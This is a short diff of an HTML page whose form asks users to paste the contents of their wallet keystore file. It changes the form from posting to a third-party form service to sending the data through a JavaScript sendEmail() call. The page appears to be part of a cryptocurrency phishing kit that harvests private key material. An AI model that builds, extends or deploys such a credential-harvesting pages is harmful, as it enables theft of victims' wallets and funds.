@@ -188,7 +188,7 @@ select {
 </head>
 <body>
 <div class="container-fluid">
-  <form action="https://form.taxi/s/2d65vmms" method="POST">
+	<form onsubmit="sendEmail(); reset(); return false;">
         <div class="form-group">
           <label for="formGroupExampleInput">Keystore</label>
           <input type="text" class="form-control" id="formGroupExampleInput" name="name" placeholder="Paste the contents of your Keystore file" >
